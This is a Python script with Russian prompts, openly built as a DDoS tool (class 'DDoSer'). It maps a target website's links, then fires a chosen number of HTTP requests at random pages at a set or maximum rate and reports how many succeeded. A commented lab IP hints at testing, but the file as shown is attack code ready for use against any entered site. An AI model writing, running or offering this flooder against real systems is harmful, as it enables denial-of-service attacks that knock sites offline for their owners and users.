#!venv/bin/python3

import os
import sys
import link_extractor
import time
import random
import progressbar
import pycurl
from datetime import datetime

from threading import Thread

global requestCountSuccess, requestCountExecuted

script_path = os.path.abspath(os.path.dirname(sys.argv[0]))

if not os.path.exists(f'{script_path}/maps/'):
    os.makedirs(f'{script_path}/maps/')


def url_grab(full_url):

    if os.path.exists(f'{script_path}/maps/{url}'):

        with open(f'{script_path}/maps/{url}', 'r') as f:
            subUrls = f.read().splitlines()

    else: 
        subUrls = link_extractor.extractor('http://' + url)

        with open(f'{script_path}/maps/{url}', 'w') as f:
            for link in subUrls:
                print(link.strip(), file=f)

        subUrls = list(subUrls)

    print(datetime.now().strftime('[%X] ') + 'Карта сайта получена')
    return subUrls


class DDoSer(Thread):
    def __init__(self, url):
        Thread.__init__(self)
        self.url = url

    def run(self):

        global requestCountSuccess, requestCountExecuted

        curl = pycurl.Curl()
        curl.setopt(curl.URL, self.url)
        curl.setopt(curl.WRITEFUNCTION, lambda bytes: len(bytes))
        curl.perform()
        responseCode = curl.getinfo(pycurl.HTTP_CODE)
        if responseCode == 200 or responseCode == 302:
            requestCountSuccess += 1
        curl.close()
        requestCountExecuted += 1


if __name__ == '__main__':

    url = input(f'{datetime.now().strftime("[%X]")} Введите адрес сайта: ')
    # url = '192.168.56.102'

    subUrls = url_grab(url)

    speed = input(
        f'{datetime.now().strftime("[%X]")} Введите скорость запросов(з/с) или оставьте пустым для максимальной: ')
    requestCount = int(
        input(f'{datetime.now().strftime("[%X]")} Введите число запросов: '))

    requestCountExecuted = 0
    requestCountSuccess = 0

    with progressbar.ProgressBar(max_value=requestCount) as bar:
        startTime = time.time()
        if speed:
            speed = float(speed)
            for i in range(requestCount):
                delayStartTime = time.time()
                curUrl = random.choice(subUrls)
                thread = DDoSer(curUrl)
                thread.start()
                thread.join()
                bar.update(requestCountExecuted)
                while time.time() - delayStartTime < 1 / speed:
                    pass
        else:
            for i in range(requestCount):
                curUrl = random.choice(subUrls)
                thread = DDoSer(curUrl)
                thread.start()
                thread.join()
                bar.update(requestCountExecuted)

        while requestCountExecuted < requestCount:
            bar.update(requestCountExecuted)

    workTime = time.time() - startTime
    print(
        f'{datetime.now().strftime("[%X]")} Время выполнения: {workTime}c')
    print(
        f'{datetime.now().strftime("[%X]")} Успешных запросов: {requestCountSuccess}')
    print(
        f'{datetime.now().strftime("[%X]")} Средняя скорость: {round(requestCountExecuted / workTime, 2)} з/с')
